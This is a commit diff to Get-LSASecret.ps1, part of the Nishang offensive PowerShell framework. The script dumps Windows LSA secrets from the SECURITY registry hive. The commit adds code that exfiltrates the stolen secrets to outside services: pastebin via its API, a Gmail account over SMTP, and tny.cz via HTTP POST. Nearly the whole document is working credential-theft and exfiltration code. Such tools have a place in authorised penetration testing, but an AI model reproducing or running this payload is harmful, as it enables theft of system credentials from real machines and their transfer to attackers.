240142a4591af09d212fbffb1a73abc550ed462e
nikhil.uitrgpv@gmail.com <nikhil.uitrgpv@gmail.com@4b9f8bdc-808e-b0e3-6e20-d0e6b7f59e2e>
2013-06-10 08:57:23 +0000

    Version 0.2.7

--- trunk/Get-LSASecret.ps1
+++ trunk/Get-LSASecret.ps1
@@ -1,22 +1,53 @@
 
 <#
 .SYNOPSIS
-Nishang payload which displays LSA Secrets from local computer.
+Nishang payload which extracts LSA Secrets from local computer.
 
 .DESCRIPTION
 Extracts LSA secrets from HKLM:\\SECURITY\Policy\Secrets\ on a local computer.
 The payload must be run with elevated permissions, in 32-bit mode and requires 
 permissions to the security key in HKLM. The permission could be obtained by using
-Enable-DuplicateToken payload.
+Enable-DuplicateToken payload. The secrets can then exfiltrated using method of choice.
 
 .PARAMETER RegistryKey
 Name of Key to Extract. if the parameter is not used, all secrets will be displayed.
 
+.PARAMETER exfil
+Use this parameter to use exfiltration methods.
+
+.PARAMETER dev_key
+The Unique API key provided by pastebin when you register a free account.
+Unused for tinypaste.
+Unused for gmail option.
+
+.PARAMETER username
+Username for the pastebin account where data would be pasted.
+Username for the tinypaste account where data would be pasted.
+Username for the gmail account where attachment would be sent as an attachment.
+
+.PARAMETER password
+Password for the pastebin account where data would be pasted.
+Password for the tinypaste account where data would be pasted.
+Password for the gmail account where data would be sent.
+
+.PARAMETER keyoutoption
+The method you want to use for exfitration of data.
+"0" for displaying on console
+"1" for pastebin.
+"2" for gmail
+"3" for tinypaste   
+
 .EXAMPLE
 PS > .\Get-LsaSecret.ps1
+The payload will ask for all required options.
 
 .EXAMPLE
 PS > .\Get-LsaSecret.ps1 -Key KeyName
+
+.EXAMPLE
+PS > .\Get-LsaSecret.ps1 -Key KeyName -exfil <devkey> <username> <password> <keyoutoption>
+
+Use above when using the payload from non-interactive shells.
 
 .LINK
 http://www.truesec.com
@@ -28,7 +59,12 @@ Goude 2012, TreuSec
 #>
 
 
-Param ( [Parameter(Position = 0)] [Alias("RegKey")][String[]] $registryKey)
+Param ([Parameter(Parametersetname="exfil")] [Switch] $exfil,
+[Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Parametersetname="noexfil")] [String] $registrykey,
+[Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
+[Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$username,
+[Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$password,
+[Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
 
 function Get-TSLsaSecret {
 
@@ -163,6 +199,7 @@ Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
             Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
           }
         }
+        $Script:pastevalue
         # Attributes
         $objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
         $objectAttributes.Length = 0
@@ -232,12 +269,16 @@ Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
         }
 
         # Return Object
-        New-Object PSObject -Property @{
+        $obj = New-Object PSObject -Property @{
           Name = $key;
           Secret = $value;
           Account = $Account
-        } | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
-      } else {
+        } 
+        
+        $script:pastevalue = $obj | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
+      
+      } 
+        else {
         Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
       }
     }
@@ -249,4 +290,77 @@ Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
   }
 }
 
-Get-TSLsaSecret
+if($exfil -eq $True)
+{
+    function Do-Exfiltration
+    {
+        $paste_name = $env:COMPUTERNAME + ": LSA Secrets"
+        function post_http($url,$parameters) 
+        { 
+            $http_request = New-Object -ComObject Msxml2.XMLHTTP 
+            $http_request.open("POST", $url, $false) 
+            $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
+            $http_request.setRequestHeader("Content-length", $parameters.length); 
+            $http_request.setRequestHeader("Connection", "close") 
+            $http_request.send($parameters) 
+            $script:session_key=$http_request.responseText 
+        } 
+
+        function Get-MD5()
+        {
+            #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
+            $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
+            $utf8 = new-object -TypeName System.Text.UTF8Encoding
+            $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
+            return $hash
+        }
+
+        if ($keyoutoption -eq "0")
+        {
+            $pastevalue
+        }
+
+        elseif ($keyoutoption -eq "1")
+        {
+            post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
+            post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
+        }
+        
+        elseif ($keyoutoption -eq "2")
+        {
+            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
+            $pastevalue
+            $smtpserver = “smtp.gmail.com”
+            $msg = new-object Net.Mail.MailMessage
+            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
+            $smtp.EnableSsl = $True
+            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
+            $msg.From = “$username@gmail.com”
+            $msg.To.Add(”$username@gmail.com”)
+            $msg.Subject = $paste_name
+            $msg.Body = $pastevalue
+            if ($filename)
+            {
+                $att = new-object Net.Mail.Attachment($filename)
+                $msg.Attachments.Add($att)
+            }
+            $smtp.Send($msg)
+        }
+
+        elseif ($keyoutoption -eq "3")
+        {
+            $pastevalue    
+            $hash = Get-MD5
+            post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$paste_name&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
+        }
+
+    }
+    Get-TSLsaSecret
+    Do-Exfiltration
+}
+
+else
+{
+    Get-TSLsaSecret
+    $pastevalue
+}
